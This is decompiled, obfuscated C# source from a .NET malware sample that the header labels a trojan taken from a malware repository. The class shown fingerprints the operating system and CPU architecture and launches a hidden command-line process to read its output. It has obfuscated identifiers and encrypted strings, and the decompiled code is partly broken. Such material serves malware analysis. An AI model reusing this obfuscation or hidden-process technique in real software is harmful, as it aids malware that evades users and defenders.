// Decompiled with JetBrains decompiler
// Type:  
// Assembly: CustomQueryInterfaceResult, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C313905-EBD1-4523-EACC-B48B0BED3910
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Crypt.gen-1b49da172b79de32c6df4e87385e57c0e3768b0b227b84cc38cd746b05200720.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

public sealed class \u0006\u2003
{
  private static \u0006\u2003.\u0002? \u0002;
  private static char? \u0003;

  public static \u0006\u2003.\u0002 \u0002()
  {
    if (!\u0006\u2003.\u0002.HasValue)
      \u0006\u2003.\u0002();
    return \u0006\u2003.\u0002.Value;
  }

  public static char \u0002()
  {
    if (!\u0006\u2003.\u0003.HasValue)
      \u0006\u2003.\u0002();
    return \u0006\u2003.\u0003.Value;
  }

  private static void \u0002()
  {
    \u0006\u2003.\u0003 = new char?(Conversions.ToChar(\u0006\u2004.\u0002(670554549)));
    switch (Environment.OSVersion.Platform)
    {
      case PlatformID.Win32S:
      case PlatformID.Win32Windows:
      case PlatformID.Win32NT:
      case PlatformID.WinCE:
      case PlatformID.Xbox:
        \u0006\u2003.\u0002 = new \u0006\u2003.\u0002?(\u0006\u2003.\u0002.Windows);
        \u0006\u2003.\u0003 = new char?(Conversions.ToChar(\u0006\u2004.\u0002(670554557)));
        break;
      case PlatformID.MacOSX:
        \u0006\u2003.\u0002 = new \u0006\u2003.\u0002?(\u0006\u2003.\u0002.Mac);
        break;
      default:
        if (Directory.Exists(\u0006\u2004.\u0002(670554533)) && Directory.Exists(\u0006\u2004.\u0002(670554513)) && Directory.Exists(\u0006\u2004.\u0002(670554499)) && Directory.Exists(\u0006\u2004.\u0002(670554484)))
        {
          \u0006\u2003.\u0002 = new \u0006\u2003.\u0002?(\u0006\u2003.\u0002.Mac);
          break;
        }
        \u0006\u2003.\u0002 = new \u0006\u2003.\u0002?(\u0006\u2003.\u0002.Linux);
        string lower = \u0006\u2003.\u0002().ToLower();
        if (!lower.Contains(\u0006\u2004.\u0002(670554471)))
          break;
        \u0006\u2003.\u0002 = new \u0006\u2003.\u0002?(\u0006\u2003.\u0002.ARMSoft);
        if (!lower.Contains(\u0006\u2004.\u0002(670554453)))
          break;
        \u0006\u2003.\u0002 = new \u0006\u2003.\u0002?(\u0006\u2003.\u0002.ARMHard);
        break;
    }
  }

  private static string \u0002()
  {
    \u0006\u2003.\u0003 obj = new \u0006\u2003.\u0003();
    obj.\u0002 = new List<string>();
    Process process = new Process();
    ProcessStartInfo startInfo = process.StartInfo;
    startInfo.FileName = \u0006\u2004.\u0002(670554438);
    startInfo.Arguments = \u0006\u2004.\u0002(670554442);
    startInfo.CreateNoWindow = true;
    startInfo.UseShellExecute = false;
    startInfo.RedirectStandardOutput = true;
    startInfo.RedirectStandardError = true;
    startInfo.RedirectStandardInput = false;
    process.OutputDataReceived += new DataReceivedEventHandler(obj._Lambda\u0024__0);
    string str;
    try
    {
      process.Start();
      process.BeginOutputReadLine();
      process.WaitForExit();
      process.Dispose();
      Thread.Sleep(500);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = Environment.OSVersion.Platform.ToString();
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public enum \u0002
  {
    Windows,
    Linux,
    Mac,
    ARMSoft,
    ARMHard,
  }

  internal sealed class \u0003
  {
    public List<string> \u0002;

    [SpecialName]
    internal void _Lambda\u0024__0(object _param1, DataReceivedEventArgs _param2) => this.\u0002.Add(_param2.Data);
  }
}
